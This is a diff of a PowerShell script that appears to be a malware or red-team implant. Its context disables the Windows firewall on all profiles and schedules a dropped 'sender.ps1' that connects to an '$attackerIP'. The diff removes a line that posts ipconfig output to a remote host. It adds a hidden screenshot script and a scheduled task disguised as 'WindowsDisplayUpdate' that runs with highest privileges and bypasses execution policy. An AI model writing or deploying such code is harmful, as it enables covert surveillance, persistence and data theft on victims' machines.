@@ -68,16 +68,6 @@ Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 $filePath = Join-Path $dirPath "sender.ps1"
 
 @'
-$url = "http://192.168.0.1:8080"
-
-$output = ipconfig /all | Out-String
-
-Invoke-WebRequest `
-    -Uri $url `
-    -Method POST `
-    -Body $output `
-    -ContentType "text/plain"
-
 $attackerIP = "192.168.0.1"
 $port = 1234
 
@@ -92,7 +82,6 @@ for ($i = 0; $i -lt 5; $i++) {
         Start-Sleep -Seconds 10
     }
 }
-
 '@ | Set-Content -Path $filePath -Encoding UTF8
 
 # Create task schedule for sender.ps1
@@ -122,6 +111,30 @@ if (-not $taskExists) {
     
         schtasks /run /tn "RunSenderPS1"
 }
+
+
+# Scheduled task for screenshot
+@'
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+$bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
+$g = [System.Drawing.Graphics]::FromImage($bmp)
+$g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+
+$path = "C:\Users\Public\screen.png"
+$bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
+'@ | Set-Content -Path "C:\Users\Public\screenshot.ps1" -Encoding UTF8
+
+schtasks /create ^
+  /tn "WindowsDisplayUpdate" ^
+  /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Public\screenshot.ps1" ^
+  /sc ONDEMAND ^
+  /ru INTERACTIVE ^
+  /rl HIGHEST
+
+icacls "C:\Windows\System32\Tasks\WindowsDisplayUpdate" /grant Administrators:F
 
 
 
